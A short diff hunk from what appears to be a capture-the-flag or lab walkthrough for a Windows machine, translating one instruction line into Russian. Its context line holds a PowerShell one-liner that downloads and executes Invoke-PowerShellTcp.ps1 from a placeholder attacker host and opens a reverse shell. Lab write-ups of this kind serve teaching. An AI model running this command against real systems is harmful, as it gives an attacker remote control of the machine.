@@ -72,7 +72,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
 ```
 
-Start your python3 http server
+Запустите свой http-сервер python3
 
 <img src="https://imgur.com/Ffh7FPk.png"/>
 
